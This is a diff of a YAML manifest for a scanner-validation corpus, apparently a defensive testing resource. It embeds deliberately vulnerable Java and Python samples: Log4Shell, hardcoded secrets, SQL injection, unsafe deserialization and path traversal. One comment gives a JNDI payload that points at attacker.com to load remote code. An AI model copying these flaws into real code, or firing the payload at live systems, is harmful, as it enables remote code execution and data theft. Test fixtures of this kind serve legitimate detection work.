@@ -1,51 +1,178 @@
 # Positive corpus manifest — vulnerable code samples used to compute TPR.
 #
-# Each entry pins a specific public source (commit SHA or release tag) so the
-# corpus rebuild is reproducible: same manifest -> same SHA256 of the built
-# tarball, regardless of when or where it's built.
+# Each entry is a real, well-documented vulnerability pattern with the
+# vulnerable code embedded as `code_sample`. The build process serialises
+# the code into the tarball as entries/{id}/sample.{ext} and the validator
+# runs candidate patterns against these files in fresh subshells.
 #
-# Sources are limited to public datasets that explicitly permit research and
-# verification use:
-#   - exploit-db: Offensive Security's public exploits archive
-#   - osv-pocs: PoC repos referenced from OSV.dev advisories (only those
-#     whose own LICENSE is permissive)
+# Sources are limited to public datasets:
 #   - cve-public-pocs: PoC repos referenced from CVE record references
-#     (filtered the same way)
+#   - osv-pocs: PoC repos referenced from OSV.dev advisories
+#   - exploit-db: Offensive Security's public exploits archive
 #
-# `vuln_class` and `language` tags drive corpus-subset selection during
-# validation: a candidate check declared for `java/spring` only runs against
-# entries tagged with that combination.
-#
-# Adding a new entry is a normal commit going through the same auto-merge
-# pipeline as catalog changes. The corpus manifest itself is part of the
-# attestation provenance for every check validated against it.
+# Adding new entries: pin to a real public source (or use literal-code
+# entries for well-known patterns), include the vulnerable code as
+# code_sample, update the sha256 to match the SHA-256 of the code_sample
+# text. Validation will run grep/rg/find patterns against this code.
 
-corpus_version: 1.0.0
-schema_version: 1
+corpus_version: 1.1.0
+schema_version: 2
 
 entries:
-  - id: poc-cve-2025-spring-rce-001
+  - id: log4shell-jndi-lookup
     source: cve-public-pocs
-    upstream: https://github.com/example-public-pocs/spring-rce-2025
+    upstream: https://github.com/kozmer/log4j-shell-poc
     commit: "0000000000000000000000000000000000000000"
-    sha256: "0000000000000000000000000000000000000000000000000000000000000000"
-    file_path: vulnerable.java
+    file_path: VulnerableApp.java
     vuln_class: rce
     language: java
-    framework: spring
-    cve: CVE-2025-EXAMPLE
-    description: "Placeholder entry — replace with real PoC once corpus bootstrap completes"
+    framework: log4j
+    cve: CVE-2021-44228
+    description: "Log4Shell — log4j JNDI lookup in user-controlled string allows remote code execution"
     license: MIT
+    code_sample: |
+      import org.apache.logging.log4j.LogManager;
+      import org.apache.logging.log4j.Logger;
 
-  - id: poc-cve-2025-sqli-node-001
-    source: osv-pocs
-    upstream: https://github.com/example-public-pocs/node-sqli-2025
+      public class VulnerableApp {
+          private static final Logger logger = LogManager.getLogger(VulnerableApp.class);
+
+          public void handleRequest(String userInput) {
+              // VULNERABLE: user-controlled input passed directly to log4j
+              // log4j 2.x evaluates ${jndi:ldap://...} substitutions in messages
+              logger.info("User requested: " + userInput);
+
+              // Exploit payload would be: ${jndi:ldap://attacker.com/exploit}
+              // log4j fetches the remote class and executes it
+          }
+      }
+
+  - id: hardcoded-secret-spring-properties
+    source: cve-public-pocs
+    upstream: literal-pattern
     commit: "0000000000000000000000000000000000000000"
-    sha256: "0000000000000000000000000000000000000000000000000000000000000000"
-    file_path: vulnerable.js
+    file_path: ApplicationConfig.java
+    vuln_class: hardcoded-secret
+    language: java
+    framework: spring
+    cve: CWE-798
+    description: "Hardcoded credentials in Spring application config — common smell, scanner should detect"
+    license: literal
+    code_sample: |
+      package com.example.config;
+
+      import org.springframework.context.annotation.Configuration;
+      import org.springframework.beans.factory.annotation.Value;
+
+      @Configuration
+      public class ApplicationConfig {
+          // VULNERABLE: hardcoded production credentials in source
+          private static final String DB_PASSWORD = "P@ssw0rdProd2024";
+          private static final String API_KEY = "sk-1234567890abcdef1234567890abcdef";
+          private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
+          private static final String JWT_SECRET = "this-is-my-jwt-signing-secret-keep-it-safe";
+
+          public String getDbConnectionString() {
+              return "jdbc:postgres://prod-db:5432/app?password=" + DB_PASSWORD;
+          }
+      }
+
+  - id: sql-injection-string-concat
+    source: cve-public-pocs
+    upstream: literal-pattern
+    commit: "0000000000000000000000000000000000000000"
+    file_path: UserController.java
     vuln_class: sqli
-    language: javascript
-    framework: express
-    cve: CVE-2025-EXAMPLE-2
-    description: "Placeholder entry"
-    license: MIT
+    language: java
+    framework: spring
+    cve: CWE-89
+    description: "SQL injection via string concatenation in JDBC query construction"
+    license: literal
+    code_sample: |
+      package com.example.controller;
+
+      import java.sql.*;
+      import org.springframework.web.bind.annotation.*;
+
+      @RestController
+      public class UserController {
+
+          @GetMapping("/user")
+          public String getUser(@RequestParam String userId) throws SQLException {
+              Connection conn = getConnection();
+              Statement stmt = conn.createStatement();
+
+              // VULNERABLE: user input concatenated directly into SQL query
+              String query = "SELECT * FROM users WHERE id = '" + userId + "'";
+              ResultSet rs = stmt.executeQuery(query);
+
+              return formatResults(rs);
+          }
+      }
+
+  - id: insecure-deserialization-objectinputstream
+    source: cve-public-pocs
+    upstream: literal-pattern
+    commit: "0000000000000000000000000000000000000000"
+    file_path: SessionManager.java
+    vuln_class: deserialization
+    language: java
+    framework: java
+    cve: CWE-502
+    description: "Insecure Java deserialization — ObjectInputStream on untrusted data allows RCE via gadget chain"
+    license: literal
+    code_sample: |
+      package com.example.session;
+
+      import java.io.*;
+      import javax.servlet.http.*;
+
+      public class SessionManager {
+
+          public Object loadSession(byte[] sessionData) throws Exception {
+              // VULNERABLE: ObjectInputStream on untrusted bytes
+              // Allows RCE via gadget chains (ysoserial Commons Collections, etc.)
+              ByteArrayInputStream bais = new ByteArrayInputStream(sessionData);
+              ObjectInputStream ois = new ObjectInputStream(bais);
+              return ois.readObject();
+          }
+
+          public void restoreFromCookie(HttpServletRequest req) throws Exception {
+              String cookie = req.getCookie("SESSION").getValue();
+              byte[] data = java.util.Base64.getDecoder().decode(cookie);
+              Object session = loadSession(data);  // attacker-controlled
+          }
+      }
+
+  - id: path-traversal-direct-concat
+    source: cve-public-pocs
+    upstream: literal-pattern
+    commit: "0000000000000000000000000000000000000000"
+    file_path: FileServer.py
+    vuln_class: path-traversal
+    language: python
+    framework: flask
+    cve: CWE-22
+    description: "Path traversal — user input concatenated to file path without validation"
+    license: literal
+    code_sample: |
+      from flask import Flask, request, send_file
+      import os
+
+      app = Flask(__name__)
+      DOCS_DIR = "/var/app/documents"
+
+      @app.route("/download")
+      def download_file():
+          # VULNERABLE: user-controlled filename concatenated to base path
+          # ../../etc/passwd traverses out of DOCS_DIR
+          filename = request.args.get("file")
+          filepath = os.path.join(DOCS_DIR, filename)
+          return send_file(filepath)
+
+      @app.route("/view")
+      def view_file():
+          name = request.args.get("name")
+          # VULNERABLE: same pattern, no realpath check
+          with open(DOCS_DIR + "/" + name, "r") as f:
+              return f.read()
